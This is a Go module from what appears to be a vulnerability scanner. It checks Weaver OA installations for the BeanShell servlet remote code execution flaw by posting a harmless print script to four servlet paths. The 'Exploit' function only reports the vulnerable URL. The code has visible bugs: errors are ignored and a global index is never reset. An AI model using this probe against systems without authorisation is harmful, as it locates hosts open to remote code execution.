package vulners

import (
	"fmt"
	"github.com/fatih/color"
	"strings"
)

type Wc07 struct {
}

var uri = []string{"/bsh.servlet.BshServlet",
	"/weaver/bsh.servlet.BshServlet",
	"/weaveroa/bsh.servlet.BshServlet",
	"/oa/bsh.servlet.BshServlet"}

var n = 6

func (s *Wc07) Scan(targetUrl string) {
	vulnerable, err := Wc07scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wc07] 存在bah 远程代码执行漏洞")
	} else {
		color.White("[Wc07] 不存在bah 远程代码执行漏洞")
	}
}

func (*Wc07) Exploit(targetUrl string) {
	runResult, err := Wc07runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]不存在bah 远程代码执行漏洞")
	}
}

func Wc07scancore(targetUrl string) (bool, error) {
	for j, i := range uri {
		resp, _ := baseClient.NewRequest().
			SetBody("bsh.script=print(\"123456\");&bsh.servlet.output=raw").
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			Post(targetUrl + i)
		resContent := resp.String()
		if strings.Contains(resContent, "123456") {
			n = j
		}
	}

	if n != 6 {
		return true, nil
	} else {
		return false, nil
	}
}

func Wc07runcore(targetUrl string) (string, error) {

	for j, i := range uri {
		resp, _ := baseClient.NewRequest().
			SetBody("bsh.script=print(\"123456\");&bsh.servlet.output=raw").
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			Post(targetUrl + i)
		resContent := resp.String()
		if strings.Contains(resContent, "123456") {
			n = j
		}
	}

	if n != 6 {
		fmt.Printf("存在漏洞的URL: " + uri[n])
		return uri[n], nil
	} else {
		return "", nil
	}
}
